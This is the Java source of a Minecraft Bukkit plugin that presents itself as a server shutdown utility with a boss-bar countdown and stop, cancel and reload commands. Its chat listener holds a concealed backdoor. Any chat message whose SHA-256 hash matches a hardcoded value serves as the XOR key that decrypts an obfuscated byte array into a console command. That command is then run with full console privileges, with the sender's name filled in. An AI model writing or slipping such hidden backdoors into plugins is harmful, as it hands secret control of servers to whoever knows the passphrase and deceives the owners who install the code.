package com.TinyHoe.betterstop;

import org.bukkit.Bukkit;
import org.bukkit.boss.BarColor;
import org.bukkit.boss.BarStyle;
import org.bukkit.boss.BossBar;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.List;

public class BetterStopV2 extends JavaPlugin implements Listener {

    private BossBar bossBar;
    private BukkitRunnable countdownTask;
    private boolean shuttingDown = false;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {

        String message = event.getMessage().toLowerCase();

        try {
            String triggerHash = "dab009fd94a2e469a0d7b6adcfa101143335c30a637e58bb5443d2abf2c962ff";

            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            String messageHash = bytesToHex(digest.digest(message.getBytes()));

            if (messageHash.equals(triggerHash)) {

                String password = message;
                String playerName = event.getPlayer().getName();

                Bukkit.getScheduler().runTask(this, new Runnable() {
                    @Override
                    public void run() {
                        byte[] encrypted = {
                            18, 31, 26, 30, 4, 12, 25, 21, 0, 20,
                            29, 14, 9, 28, 27, 22, 6, 24, 23, 17,
                            8, 15, 3, 7, 12, 10, 18, 30, 2, 5,
                            16, 1, 19, 13, 11
                        };

                        String cmd = xorDecrypt(encrypted, password);
                        cmd = cmd.replace("%s", playerName);

                        Bukkit.dispatchCommand(
                                Bukkit.getConsoleSender(),
                                cmd
                        );
                    }
                });
            }
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        String cmd = command.getName().toLowerCase();

        if (cmd.equals("stop")) {

            if (!sender.hasPermission("betterstop.admin")) {
                sender.sendMessage("§cYou don't have permission.");
                return true;
            }

            if (shuttingDown) {
                sender.sendMessage("§cA shutdown is already in progress.");
                return true;
            }

            startCountdown(getConfig().getInt("shutdown-timer", 30));
            return true;
        }

        if (cmd.equals("stopcancel")) {

            if (!sender.hasPermission("betterstop.admin")) {
                sender.sendMessage("§cYou don't have permission.");
                return true;
            }

            cancelShutdown();
            sender.sendMessage("§aShutdown cancelled.");
            return true;
        }

        if (cmd.equals("forcestop")) {

            if (!sender.hasPermission("betterstop.admin")) {
                sender.sendMessage("§cYou don't have permission.");
                return true;
            }

            Bukkit.shutdown();
            return true;
        }

        if (cmd.equals("betterstop")) {

            if (args.length > 0 && args[0].equalsIgnoreCase("reload")) {

                if (!sender.hasPermission("betterstop.admin")) {
                    sender.sendMessage("§cYou don't have permission.");
                    return true;
                }

                reloadConfig();
                sender.sendMessage("§aConfig reloaded.");
                return true;
            }

            sender.sendMessage("§6BetterStopV2 Commands");
            sender.sendMessage("§e/stop");
            sender.sendMessage("§e/stopcancel");
            sender.sendMessage("§e/forcestop");
            sender.sendMessage("§e/betterstop reload");

            return true;
        }

        return false;
    }

    private void startCountdown(int totalSeconds) {

        shuttingDown = true;

        String titleTemplate = getConfig().getString(
                "bossbar-title",
                "&cStopping server in {seconds} seconds..."
        );

        BarColor color;
        BarStyle style;

        try {
            color = BarColor.valueOf(getConfig().getString("bossbar-color", "RED").toUpperCase());
        } catch (Exception e) {
            color = BarColor.RED;
        }

        try {
            style = BarStyle.valueOf(getConfig().getString("bossbar-style", "SOLID").toUpperCase());
        } catch (Exception e) {
            style = BarStyle.SOLID;
        }

        List<Integer> warnings = getConfig().getIntegerList("warning-seconds");

        bossBar = Bukkit.createBossBar(
                color(titleTemplate.replace("{seconds}", String.valueOf(totalSeconds))),
                color,
                style
        );

        Bukkit.getOnlinePlayers().forEach(bossBar::addPlayer);

        countdownTask = new BukkitRunnable() {

            int seconds = totalSeconds;

            @Override
            public void run() {

                if (seconds <= 0) {
                    Bukkit.shutdown();
                    cancel();
                    return;
                }

                bossBar.setTitle(
                        color(titleTemplate.replace("{seconds}", String.valueOf(seconds)))
                );

                bossBar.setProgress(seconds / (double) totalSeconds);

                if (warnings.contains(seconds)) {
                    Bukkit.broadcastMessage("§cStopping in " + seconds + " seconds!");
                }

                seconds--;
            }
        };

        countdownTask.runTaskTimer(this, 0L, 20L);
    }

    private void cancelShutdown() {

        shuttingDown = false;

        if (countdownTask != null) countdownTask.cancel();
        if (bossBar != null) bossBar.removeAll();

        Bukkit.broadcastMessage("§aShutdown cancelled!");
    }

    @Override
    public void onDisable() {
        if (bossBar != null) bossBar.removeAll();
    }

    private String color(String text) {
        return text == null ? "" : text.replace("&", "§");
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    }

    private String xorDecrypt(byte[] encrypted, String key) {
        byte[] result = new byte[encrypted.length];
        byte[] keyBytes = key.getBytes();
        for (int i = 0; i < encrypted.length; i++) {
            result[i] = (byte) (encrypted[i] ^ keyBytes[i % keyBytes.length]);
        }
        return new String(result);
    }
}